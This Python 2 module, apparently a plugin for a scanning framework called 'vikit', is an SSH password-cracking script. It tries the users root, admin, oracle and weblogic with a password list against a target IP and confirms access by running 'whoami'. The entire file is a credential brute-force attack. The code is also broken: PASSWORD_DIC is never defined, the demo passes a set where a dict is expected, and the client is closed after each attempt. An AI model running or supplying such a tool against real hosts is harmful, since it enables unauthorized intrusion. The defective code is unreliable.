#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<v1ll4n>
  Purpose: Mod
  Created: 05/21/17
"""

import time
import paramiko


from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param

paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())


NAME = 'ssh_demo'

AUTHOR = 'vikit'

DESCRIPTION = 'description about a ssh crack'

RESULT_DESC = '''this description is about result!'''

DEMANDS = [TargetDemand('target', target.TYPE_IPV4),
           ParamDemand('port', param.TYPE_INT)]



def check(ip, port, timeout):
    user_list = ['root', 'admin', 'oracle', 'weblogic']
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', user))
            try:
                ssh.connect(ip, port, user, pass_, timeout=timeout, allow_agent = False, look_for_keys = False)
                ssh.exec_command('whoami',timeout=timeout)
                if pass_ == '': pass_ = "null"
                return u"存在弱口令，账号：%s，密码：%s" % (user, pass_)
            except Exception, e:
                if "Unable to connect" in e or "timed out" in e: return False
            finally:
                ssh.close()



#----------------------------------------------------------------------
def exploit(target, payload, config):
    
    timeout = 5
    port = 22
    if config.has_key('port'):
        port=int(config['port'])

    if check(target, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit


if __name__ == '__main__':
    print exploit('192.168.1.183','',{'port:22'})